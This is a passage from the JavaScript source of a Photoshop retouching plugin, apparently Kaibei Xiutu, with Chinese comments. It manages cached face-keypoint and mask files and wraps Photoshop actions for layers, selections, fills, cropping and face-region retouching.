      } else return slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + md5(docPath) + '/mask' + Area + '.png'; //PS打开的照片
    } catch (e) {//没有保存过
      return slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + doc.id + '/mask' + Area + '.png'; //PS中没有保存的照片
    }
  },
  getJsonFile: function () { //获取区域蒙板文件
    var doc = app.activeDocument;
    try {//保存过
      var docPath = doc.fullName.fsName; //当前文件路径
      if (docPath.indexOf('KBXiutuMaxPhotos') > -1) { //导入的照片
        if (File(docPath).parent.name == 'e9aef383da0075e2f0db8837b7ea57bc') return slashPath(File(docPath).parent.parent.fsName) + '/keypoints.json'; //在效果文件夹
        else return slashPath(File(docPath).parent.fsName) + '/keypoints.json'; //在原文件夹
      } else return slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + md5(docPath) + '.json'; //PS打开的照片
    } catch (e) {//没有保存过
      return slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + doc.id + '.json'; //PS中没有保存的照片
    }
  },
  getFaceData: function (funData, isBat, isMask) { //获取人脸数据
    //funData:功能指令回调
    // isMask = !1;//false:不生成蒙板，true:生成蒙板，'slimBody':生成瘦身蒙板
    var maskName = 'maskSeg';//
    if (!isBat && isMask == 'slimBody') maskName = 'maskHeat';
    try { var doc = app.activeDocument } catch (e) { return !1 }
    if (isBat && globalFaceData && globalFaceData.id == doc.id) return globalFaceData.data;
    else globalFaceData = !1;
    var docPath = ''; //当前照片路径
    var jsonPath = ''; //数据文件路径
    // debugger;
    try {//保存过
      docPath = doc.fullName.fsName; //当前文件路径
      if (docPath.indexOf('KBXiutuMaxPhotos') > -1) { //导入的照片
        if (File(docPath).parent.name == 'e9aef383da0075e2f0db8837b7ea57bc') jsonPath = slashPath(File(docPath).parent.parent.fsName) + '/keypoints.json'; //在效果文件夹
        else jsonPath = slashPath(File(docPath).parent.fsName) + '/keypoints.json'; //在原文件夹
      } else jsonPath = slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + md5(docPath) + '.json'; //PS打开的照片
      try {
        if (File(jsonPath).exists) {
          var faceData = JSON.parse(this.readFile(jsonPath)); //获取数据时
          var docSize = this.getDocSize();//照片大小
          if ((Math.abs(docSize.width / docSize.height - faceData.width / faceData.height) < 0.005 || isBat || funData.indexOf('lengthenLeg') > -1) && faceData.peopleArr) {
            // if(!isMask || (isMask && File(docPath.indexOf('KBXiutuMaxPhotos')>-1 ? File(jsonPath).parent + '/mask/'+maskName+'.png' : jsonPath.substr(0,jsonPath.lastIndexOf(".")) + '/'+maskName+'.png').exists)) return faceData;
            if (!maskName || (maskName && File(docPath.indexOf('KBXiutuMaxPhotos') > -1 ? File(jsonPath).parent + '/mask/' + maskName + '.png' : jsonPath.substr(0, jsonPath.lastIndexOf(".")) + '/' + maskName + '.png').exists)) {
              globalFaceData = { id: doc.id, data: faceData }
              return faceData;
            }
          } else { //获取临时人脸数据
            // //删除蒙板文件
            // var pngList = Folder(jsonPath.indexOf('/keypoints.json')>-1 ? (File(jsonPath).parent + '/mask/') : jsonPath.substr(0,jsonPath.lastIndexOf("."))).getFiles('*.png');
            // for(var i=0;i<pngList.length;i++){pngList[i].remove()};
            // //临时人脸数据
            // jsonPath = Folder.userData.fsName + '/Kaibei/Xiutu/keypoints/' + md5(docPath) + '.json'; //临时人脸数据
            // faceData = JSON.parse(this.readFile(jsonPath)); //获取数据时
            // var isScale = (Math.abs(docSize.width/docSize.height - faceData.width/faceData.height) < 0.005) || funData.indexOf('lengthenLeg')>-1;
            // if(!isScale){
            File(jsonPath).remove();
            var pngList = Folder(jsonPath.indexOf('/keypoints.json') > -1 ? (File(jsonPath).parent + '/mask/') : jsonPath.substr(0, jsonPath.lastIndexOf("."))).getFiles('*.png');
            for (var i = 0; i < pngList.length; i++) { pngList[i].remove() };
            // }
            // if((isScale || isBat) && faceData.peopleArr && (!isMask || (isMask && File(File(jsonPath).parent + '/mask/'+maskName+'.png').exists))) return faceData;
          }
          // }else{ //从PS打开的照片加提示
          //   var faceCheckNum = Number(this.getCustomOptions('faceCheckPrompt'));
          //   if(docPath.indexOf('KBXiutuMaxPhotos')<1 && faceCheckNum<10){
          //     this.sendEvent({type:'message', duration: 5000, success:2, data:'从开贝修图打开照片，处理速度会更快！'});//+(10-faceCheckNum)
          //     this.putCustomOptions('faceCheckPrompt',faceCheckNum+1,true);
          //   }
        }
      } catch (e) { }
      if (!isBat) {
        globalFaceData = !1;
        this.sendEvent({ type: 'faceApi', data: { id: doc.id, docPath: docPath, funData: funData, mask: isMask ? isMask : !1 } }); //没有数据时
      }
    } catch (e) {//没有保存过
      jsonPath = slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + doc.id + '.json'; //PS中没有保存的照片
      try {
        if (File(jsonPath).exists) {
          var faceData = JSON.parse($._Kaibei.readFile(jsonPath)); //获取数据时
          var docSize = { width: doc.width.as('px'), height: doc.height.as('px') }; //照片大小
          if ((Math.abs(docSize.width / docSize.height - faceData.width / faceData.height) < 0.005 || isBat || funData.indexOf('lengthenLeg') > -1) && faceData.peopleArr) {
            // if(!isMask || (isMask && File(jsonPath.substr(0,jsonPath.lastIndexOf(".")) + '/'+maskName+'.png').exists)) return faceData;
            if (!maskName || (maskName && File(jsonPath.substr(0, jsonPath.lastIndexOf(".")) + '/' + maskName + '.png').exists)) {
              globalFaceData = { id: doc.id, data: faceData }
              return faceData;
            }
          } else {
            File(jsonPath).remove();
            var pngList = Folder(jsonPath.substr(0, jsonPath.lastIndexOf("."))).getFiles('*.png');
            for (var i = 0; i < pngList.length; i++) { pngList[i].remove() };
          }
        }
      } catch (e) { }
      // var faceCheckNum = Number(this.getCustomOptions('faceCheckPrompt'));
      // if(faceCheckNum<10){
      //   this.sendEvent({type:'message', duration: 5000, success:2, data:'从开贝修图打开照片，处理速度会更快！'});//+(10-faceCheckNum)
      //   this.putCustomOptions('faceCheckPrompt',faceCheckNum+1,true);
      // }
      if (!isBat) {
        globalFaceData = !1;
        this.sendEvent({ type: 'faceApi', data: { id: doc.id, docPath: docPath, funData: funData, mask: isMask ? isMask : !1 } });
      }
    }
    return !1
  },
  removeAiData: function () { //删除AI数据
    var dataPath = File(this.getAreaFile('')).parent;
    if (!Folder(dataPath).exists) return;
    var pngList = dataPath.getFiles('*.png');
    for (var i = 0; i < pngList.length; i++) { pngList[i].remove() }
    pngList = dataPath.parent.getFiles('*.json');
    for (var i = 0; i < pngList.length; i++) { pngList[i].remove() }
    globalFaceData = !1
  },
  psPurge: function (data) { //PS清理：clipboard/剪贴板，history/历史记录，allEnum/全部
    var desc1 = new ActionDescriptor();
    desc1.putEnumerated(cTID("null"), cTID("PrgI"), sTID(data || 'allEnum'));
    app.executeAction(cTID("Prge"), desc1, DialogModes.NO);
  },
  suspendHistory: function (name, ftn, doc) {
    doc = doc || app.activeDocument;
    doc.suspendHistory(name, ftn);
    app.activeDocument = app.activeDocument; // NOP
  },
  delHistory: function (iType) { //删除当前历史记录
    //Current: 当前记录
    //Previous: 上一条记录
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      if (iType == 'Previous') ref1.putEnumerated(cTID('HstS'), cTID('Ordn'), cTID('Prvs'));
      else ref1.putProperty(cTID('HstS'), cTID('CrnH'));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  setActionPlaybackOption: function (opt, arg) {
    function _ftn() {
      var desc = new ActionDescriptor();
      var ref = new ActionReference();
      ref.putProperty(cTID("Prpr"), cTID("PbkO"));
      ref.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      desc.putReference(cTID("null"), ref);
      var pdesc = new ActionDescriptor();
      pdesc.putEnumerated(sTID("performance"), sTID("performance"), sTID(opt));
      if (opt == "pause" && arg != undefined) {
        pdesc.putInteger(sTID("pause"), parseInt(arg));
      }
      desc.putObject(cTID("T   "), cTID("PbkO"), pdesc);
      app.executeAction(cTID("setd"), desc, DialogModes.NO);
    }
    _ftn();
  },
  setPlaybackAccelerated: function () { //设置加速
    this.setActionPlaybackOption("accelerated");
  },
  setPlaybackStepByStep: function () { //设置逐步
    this.setActionPlaybackOption("stepByStep");
  },
  setPlaybackPaused: function (delaySec) { //设置暂停
    this.setActionPlaybackOption("pause", delaySec);
  },
  cropDoc: function (iRect, isDelete, resolution) { //裁剪
    try {
      var desc1 = new ActionDescriptor();
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Top '), cTID('#Pxl'), iRect[1]);
      desc2.putUnitDouble(cTID('Left'), cTID('#Pxl'), iRect[0]);
      desc2.putUnitDouble(cTID('Btom'), cTID('#Pxl'), iRect[3]);
      desc2.putUnitDouble(cTID('Rght'), cTID('#Pxl'), iRect[2]);
      desc1.putObject(cTID('T   '), cTID('Rctn'), desc2);
      desc1.putUnitDouble(cTID('Angl'), cTID('#Ang'), 0);
      desc1.putBoolean(cTID('Dlt '), isDelete == true);
      desc1.putEnumerated(sTID("cropAspectRatioModeKey"), sTID("cropAspectRatioModeClass"), sTID("pureAspectRatio"));
      desc1.putBoolean(cTID('CnsP'), false);
      if (resolution) desc1.putUnitDouble(cTID('Rslt'), cTID('#Rsl'), resolution);
      app.executeAction(sTID('crop'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  cropDocBySelection: function () { //根据选区裁剪
    try {
      var desc1 = new ActionDescriptor();
      app.executeAction(sTID('crop'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  modifyCanvas: function (direction, isRelative, val, unit, bgColor) { //改变画布
    try {
      var desc1 = new ActionDescriptor();
      desc1.putBoolean(cTID('Rltv'), isRelative == true);
      if (direction == 'center') {
        desc1.putUnitDouble(cTID('Wdth'), sTID(unit || 'pixelsUnit'), typeof (val) == 'object' ? val[0] : val);
        desc1.putEnumerated(cTID('Hrzn'), cTID('HrzL'), cTID('Cntr'));
        if (typeof (val) == 'object' && val.length > 1) {
          if (val[0]) {
            desc1.putUnitDouble(cTID('Wdth'), sTID(unit || 'pixelsUnit'), val[0]);
            desc1.putEnumerated(cTID('Hrzn'), cTID('HrzL'), sTID('Cntr'));
          }
          if (val[1]) {
            desc1.putUnitDouble(cTID('Hght'), sTID(unit || 'pixelsUnit'), val[1]);
            desc1.putEnumerated(cTID('Vrtc'), cTID('VrtL'), cTID('Cntr'));
          }
        }
      } else if (direction == 'left' || direction == 'right') {
        desc1.putUnitDouble(cTID('Wdth'), sTID(unit || 'pixelsUnit'), val);
        desc1.putEnumerated(cTID('Hrzn'), cTID('HrzL'), sTID(direction));
      } else {
        desc1.putUnitDouble(cTID('Hght'), sTID(unit || 'pixelsUnit'), val);
        desc1.putEnumerated(cTID('Vrtc'), cTID('VrtL'), sTID(direction));
      }
      if (bgColor) {
        var desc2 = new ActionDescriptor();
        desc2.putUnitDouble(cTID('H   '), cTID('#Ang'), 0);
        desc2.putDouble(cTID('Strt'), bgColor[0]);
        desc2.putDouble(cTID('Brgh'), bgColor[1]);
        desc1.putObject(sTID("canvasExtensionColor"), cTID('HSBC'), desc2);
      }
      app.executeAction(sTID('canvasSize'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  fillLayer: function (iColor, iOpacity, isTransparent) { //填充图层颜色
    try {
      var hsb = (iColor instanceof Array) ? { h: 0, s: iColor[0], b: iColor[1] } : iColor;
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Clr '));
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('H   '), cTID('#Ang'), hsb.h);
      desc2.putDouble(cTID('Strt'), hsb.s);
      desc2.putDouble(cTID('Brgh'), hsb.b);
      desc1.putObject(cTID('Clr '), cTID('HSBC'), desc2);
      desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), iOpacity === undefined ? 100 : iOpacity);
      desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
      if (isTransparent) desc1.putBoolean(cTID('PrsT'), true);
      app.executeAction(sTID('fill'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  fillColor: function (iColor, iMode, iOpacity, isTransparent) { //填充图层颜色
    try {
      var rgb = (typeof iColor == 'string') ? this.hexToRgb(iColor) : iColor;
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Clr '));
      var desc2 = new ActionDescriptor();
      desc2.putDouble(cTID('Rd  '), rgb[0]);
      desc2.putDouble(cTID('Grn '), rgb[1]);
      desc2.putDouble(cTID('Bl  '), rgb[2]);
      desc1.putObject(cTID('Clr '), sTID("RGBColor"), desc2);
      desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), iOpacity === undefined ? 100 : iOpacity);
      desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), sTID(iMode || 'normal'));
      if (isTransparent) desc1.putBoolean(cTID('PrsT'), true);
      app.executeAction(sTID('fill'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  fillBK: function (isBlack, iOpacity) { //填充图层颜色
    try {
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID(isBlack ? 'Blck' : 'Wht '));
      desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), iOpacity === undefined ? 100 : iOpacity);
      desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
      app.executeAction(sTID('fill'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  newLayer: function (iName) {  //创建新图层
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putClass(cTID('Lyr '));
    desc1.putReference(cTID('null'), ref1);
    if (iName) {
      var desc2 = new ActionDescriptor();
      desc2.putString(cTID('Nm  '), iName);
      desc1.putObject(cTID('Usng'), cTID('Lyr '), desc2);
    }
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
  },
  protectPosition: function (isLock) {  //锁定图层移动
    var result = !0;
    try {
      isLock = isLock != undefined ? isLock : true;
      // var desc1 = new ActionDescriptor();
      // var ref1 = new ActionReference();
      // ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      // desc1.putReference(cTID('null'), ref1);
      // var desc2 = new ActionDescriptor();
      // var desc3 = new ActionDescriptor();
      // desc3.putBoolean(sTID("protectPosition"), isLock);
      // desc2.putObject(sTID("layerLocking"), sTID("layerLocking"), desc3);
      // desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      // app.executeAction(sTID('set'), desc1, DialogModes.NO);
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putBoolean(sTID("protectPosition"), isLock);
      desc1.putObject(sTID("layerLocking"), sTID("layerLocking"), desc2);
      app.executeAction(sTID('applyLocking'), desc1, DialogModes.NO);
    } catch (e) { result = !1 }
    return result
  },
  setLayerMode: function (colorMode) {  //设置图层模式
    var result = !0;
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putEnumerated(cTID('Md  '), cTID('BlnM'), sTID(colorMode));
      desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
    } catch (e) { result = !1 }
    return result
  },
  newPlacedLayer: function () { //转换成智能对象
    app.executeAction(sTID('newPlacedLayer'), undefined, DialogModes.NO);
  },
  editPlacedLayer: function () { //编辑智能对象内容
    var desc1 = new ActionDescriptor();
    app.executeAction(sTID('placedLayerEditContents'), desc1, DialogModes.NO);
  },
  toBaseLayer: function (funName, tName) {  //初始化图层
    var _this = this;
    var doc = app.activeDocument;
    if (doc.mode !== DocumentMode.RGB) this.convertMode("RGBColorMode");
    _toBaseLayer = function () {
      //尝试转到指定层
      if (_this.selectLayerByName(funName, true)) {
        if (!doc.activeLayer.visible) _this.setLayerVisible(1);
        return funName;
      }
      var baseName = localize($.local.repairLayer);  //默认为修饰层
      var baseLayer = _this.getLayerByName(baseName);
      if (baseLayer) {
        _this.selectLayerByName(baseName);
        if (!baseLayer.visible) baseLayer.visible = true;
        if (tName) _this.cutNewLayer(tName);
        if (baseLayer.parent.typename == 'LayerSet') _this.moveTop();
      } else {
        _this.mergeNewLayer(baseName);
        doc.activeLayer.positionLocked = true;
        if (tName) _this.duplicateLayer(tName); //复制底层并更名
      }
      if (!funName && doc.activeLayer.name != baseName) {
        _this.mergeWith(baseName);
        _this.moveTop();
      }
      return doc.activeLayer.name;
    }
    doc.suspendHistory(localize($.local.repairLayer).split("|")[1], '$_rs=_toBaseLayer()');
    return $_rs;
  },
  mergeEffect: function () { //合并效果
    try {
      var doc = app.activeDocument;
      if (doc.mode !== DocumentMode.RGB) this.convertMode("RGBColorMode");
      var repairLayerName = localize($.local.repairLayer);
      //只有一个图层时
      if (doc.layers.length == 1) {
        if (!doc.layers[0].isBackgroundLayer) doc.layers[0].isBackgroundLayer = !0;
        this.duplicateLayer(repairLayerName)
        return !0
      }
      //第一个图层是效果层时
      var layers = doc.layers;
      var iLayer = layers[0];
      this.selectLayerByID(iLayer.id);
      if (iLayer.name == repairLayerName) {
        if (iLayer.opacity < 100 || iLayer.blendMode != BlendMode.NORMAL) this.mergeMask(repairLayerName)
        return !0;
      }
      //效果层不在第一个图层时
      if (this.getLayerByName(repairLayerName)) {
        var nameList = iLayer.name.split('|');
        if (nameList.length == 3 && nameList[0] == '$XT' && nameList[2] == '') {
          this.mergeWith(repairLayerName);
          return !0
        } else { //如果第一个图层是用户的图层
          function _editLayerName(ls) {
            for (var n = 0; n < ls.length; n++) {
              if (ls[n].typename == 'LayerSet') _editLayerName(ls[n].layers);
              var nameList = ls[n].name.split('|');
              if (nameList.length == 3 && nameList[0] == '$XT') ls[n].name = nameList[1] + '|' + nameList[2]
            }
          }
          _editLayerName(layers)
        }
      }
      this.mergeNewLayer(repairLayerName) //没有效果层时
      while (doc.activeLayer.parent != doc) this.moveTop()
      return !0
    } catch (e) { return !1 }
  },
  duplicateLayerToNewdoc: function (docName, layerName) {
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(cTID('Dcmn'));
      desc1.putReference(cTID('null'), ref1);
      if (docName) desc1.putString(cTID("Nm  "), docName);
      var ref2 = new ActionReference();
      ref2.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('Usng'), ref2);
      if (layerName) desc1.putString(cTID('LyrN'), layerName);
      desc1.putInteger(cTID('Vrsn'), 5);
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  duplicateLayerToDoc: function (docName, layerName) {
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      if (docName) ref2.putName(cTID('Dcmn'), docName);
      desc1.putReference(cTID('T   '), ref2);
      // desc1.putInteger(sTID("destinationDocumentID"), docID);
      if (layerName) desc1.putString(cTID('Nm  '), layerName);
      desc1.putInteger(cTID('Vrsn'), 5);
      app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  duplicateDoc: function (docName, isMerge) {
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Dcmn'), cTID('Ordn'), cTID('Frst'));
      desc1.putReference(cTID('null'), ref1);
      if (docName) desc1.putString(cTID('Nm  '), docName);
      if (isMerge) desc1.putBoolean(cTID('Mrgd'), true);
      app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  getLayerBounds: function (iName) { //获取图层坐标
    try {
      if (iName) return this.getLayerByName(iName).bounds;
      else return app.activeDocument.activeLayer.bounds;
    } catch (e) { return !1 }
  },
  getInterpolation: function () { //获取当前变换算法
    try {
      var desc1 = new ActionDescriptor();
      if (this.getSelectionBounds()) {
        var ref1 = new ActionReference();
        ref1.putProperty(cTID('Chnl'), sTID("selection"));
        desc1.putReference(cTID('null'), ref1);
      }
      var desc = app.executeAction(sTID('transform'), desc1, DialogModes.NO);
      return desc.getEnumerationValue(cTID('Intr'));
    } catch (e) { return !1 }
  },
  putInterpolation: function (Intr, isSel) { //改变当前变换算法
    try {
      var desc1 = new ActionDescriptor();
      if (isSel) {
        var ref1 = new ActionReference();
        ref1.putProperty(cTID('Chnl'), sTID("selection"));
        desc1.putReference(cTID('null'), ref1);
      }
      desc1.putEnumerated(cTID('Intr'), cTID('Intp'), Intr || sTID('bicubicAutomatic'));
      app.executeAction(sTID('transform'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  getSelectionBounds: function () { //获取选区坐标
    try { return app.activeDocument.selection.bounds } catch (e) { return !1 }
  },
  boundsToInt: function (iBounds) { //bounds转数字
    try { return [iBounds[0].as('px'), iBounds[1].as('px'), iBounds[2].as('px'), iBounds[3].as('px')] } catch (e) { return [0, 0, 0, 0] }
  },
  drawArea: function (faceD, pointList, scale, addSubtract) { //画选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      var list1 = new ActionList();
      for (var i = pointList[0]; i <= (pointList[1] + pointList.length - 2); i++) {
        var point = faceD.face[i > pointList[1] ? pointList[i - pointList[1] + 1] : i];
        var desc = new ActionDescriptor();
        desc.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), point[0] * scale);
        desc.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), point[1] * scale);
        list1.putObject(cTID('Pnt '), desc);
      }
      desc2.putList(cTID('Pts '), list1);
      desc1.putObject(cTID('T   '), cTID('Plgn'), desc2);
      desc1.putBoolean(cTID('AntA'), true);
      app.executeAction(sTID(addSubtract || 'addTo'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  getMaxFaceID: function (faceData, faceList) { //获取最大脸ID
    var faceID = -1, faceArea = 0;
    for (var n = 0; n < faceData.length; n++) {
      if (!faceData[n].faceScore) continue;
      faceList[this.getFaceDir(faceData[n].face) != 'center' ? 0 : 1].push(n) //正侧脸分类
      faceList[2].push(n) //脸部列表
      var tmpArea = faceData[n].faceRect.width * faceData[n].faceRect.height
      if (tmpArea > faceArea) {
        faceArea = tmpArea;
        faceID = n;
      }
    }
    return faceID
  },
  getGender: function (faceData, gender, isbat) { //性别处理逻辑
    if (gender.length == 0) gender.push('all')
    var genderList = [] //性别列表
    for (var n = 0; n < faceData.length; n++) {
      if (!faceData[n].faceScore) continue;
      if (faceData[n].age < 14) faceData[n].gender = 'children'
      else if (faceData[n].age > 60) faceData[n].gender = 'elderly'
      genderList.push(faceData[n].gender)
    }
    if (isbat) return;
    if (gender[0] != 'all') {
      var hasGender = !1
      for (var n = 0; n < gender.length; n++) {
        if (this.contains(genderList, gender[n])) {
          hasGender = !0
          break
        }
      }
      if (!hasGender) { //照片中没有对应的性别时
        if (gender.length == 1) {
          switch (gender[0]) {
            case 'male':
              if (this.contains(genderList, 'female')) gender.push('female')
              else if (this.contains(genderList, 'elderly')) gender.push('elderly')
              else if (this.contains(genderList, 'children')) gender.push('children')
              break;
            case 'female':
              if (this.contains(genderList, 'male')) gender.push('male')
              else if (this.contains(genderList, 'elderly')) gender.push('elderly')
              else if (this.contains(genderList, 'children')) gender.push('children')
              break;
            case 'elderly':
              if (this.contains(genderList, 'male')) gender.push('male')
              if (this.contains(genderList, 'female')) gender.push('female')
              if (gender.length == 1) gender.push('children')
              break;
            case 'children':
              if (this.contains(genderList, 'male')) gender.push('male')
              if (this.contains(genderList, 'female')) gender.push('female')
              if (gender.length == 1) gender.push('elderly')
              break;
          }
        } else if (gender.length == 2) {
          if (this.contains(gender, 'male') && this.contains(gender, 'female')) {
            if (this.contains(genderList, 'elderly')) gender.push('elderly')
            else gender.push('children')
          } else if (this.contains(gender, 'male') && this.contains(gender, 'children')) {
            if (this.contains(genderList, 'female')) gender.push('female')
            else gender.push('elderly')
          } else if (this.contains(gender, 'male') && this.contains(gender, 'elderly')) {
            if (this.contains(genderList, 'female')) gender.push('female')
            else gender.push('children')
          } else if (this.contains(gender, 'female') && this.contains(gender, 'children')) {
            if (this.contains(genderList, 'male')) gender.push('male')
            else gender.push('elderly')
          } else if (this.contains(gender, 'female') && this.contains(gender, 'elderly')) {
            if (this.contains(genderList, 'male')) gender.push('male')
            else gender.push('children')
          } else if (this.contains(gender, 'children') && this.contains(gender, 'elderly')) {
            if (this.contains(genderList, 'male')) gender.push('male')
            if (this.contains(genderList, 'female')) gender.push('female')
          }
        } else {
          gender.splice(0, gender.length)
          gender.push('all')
        }
      }
    }
  },
  getFiveArea: function (part, faceData, scale) { //五官选区
    if (typeof part == 'string') part = [part];
    if (faceData.face) faceData = [faceData]; //传入单人时
    try {
      this.deSelection();
      for (var n = 0; n < faceData.length; n++) {
        if (!faceData[n].faceScore) continue;
        if (this.findIndex(part, 'eye') >= 0) { //眼睛
          this.drawArea(faceData[n], [60, 67], scale)
          this.drawArea(faceData[n], [68, 75], scale)
        }
        if (this.findIndex(part, 'eyebrow') >= 0) { //眉毛
          this.drawArea(faceData[n], [33, 41], scale)
          this.drawArea(faceData[n], [42, 50], scale)
        }
        if (this.findIndex(part, 'nostril') >= 0) { //鼻孔
          this.drawArea(faceData[n], [54, 59], scale)
        }
        if (this.findIndex(part, 'nose') >= 0) { //鼻子
          this.drawArea(faceData[n], [55, 59, 51], scale)
        }
        if (this.findIndex(part, 'mouse') >= 0) { //嘴巴
          this.drawArea(faceData[n], [76, 87], scale)
        }
        if (this.findIndex(part, 'teeth') >= 0) { //牙齿
          this.drawArea(faceData[n], [88, 95], scale)
        }
        if (this.findIndex(part, 'lip') >= 0) { //嘴唇
          this.drawArea(faceData[n], [76, 87], scale)
          this.drawArea(faceData[n], [88, 95], scale, 'subtractFrom')
        }
        if (this.findIndex(part, 'face') >= 0) { //脸部
          this.drawArea(faceData[n], [0, 32], scale)
        }
      }
      return !0
    } catch (e) { return !1 }
  },
  getFaceDir: function (faceD, angle) { //检测人脸朝向
    try {
      angle = angle || 25
      var leftFace = this.getDistance(faceD[52], faceD[3])
      var rightFace = this.getDistance(faceD[52], faceD[29])
      var ratio = 100 * leftFace / (leftFace + rightFace)
      // alert(ratio + ' | ' + leftFace + ' | ' + rightFace)
      if (ratio < angle) return 'left';
      else if (ratio > 100 - angle) return 'right';
      else return 'center';
    } catch (e) { return !1 }
  },
  getFaceSide: function (faceD, angle) { //检测是不是侧脸
    try {
      angle = angle || 15
      var p = this.getDistance(faceD.kps[0], faceD.kps[3]) //左眼到左嘴
      var a = this.getDistance(faceD.kps[0], faceD.kps[1]) //左眼到右眼
      var b = this.getDistance(faceD.kps[4], faceD.kps[3]) //左嘴到右嘴
      // alert((a / p + b / p) / 2 * 100)
      if ((a / p + b / p) / 2 * 100 < angle) return !0
    } catch (e) { return !1 }
  },
  moveLayer: function (iPos) { //移动图层坐标
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), iPos[0]);
      desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), iPos[1]);
      desc1.putObject(cTID('T   '), cTID('Ofst'), desc2);
      app.executeAction(sTID('move'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  alignToCanvas: function (isH) { //对齐画布
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      desc1.putEnumerated(cTID('Usng'), cTID('ADSt'), sTID(isH ? "ADSCentersH" : "ADSCentersV"));
      desc1.putBoolean(sTID("alignToCanvas"), true);
      app.executeAction(sTID('align'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  deSelection: function () { //取消选区
    app.activeDocument.selection.deselect();
  },
  invSelection: function () { //选区反选
    app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
  },
  saveSelection: function (iName, docName) { //储存通道选区
    try {
      this.delSelection(iName);
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      if (docName) {
        var ref2 = new ActionReference();
        ref2.putName(cTID('Dcmn'), docName);
        desc1.putReference(cTID('T   '), ref2);
      }
      desc1.putString(cTID('Nm  '), iName);
      app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  loadSelection: function (iName) { //加载通道选区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putName(cTID('Chnl'), iName);
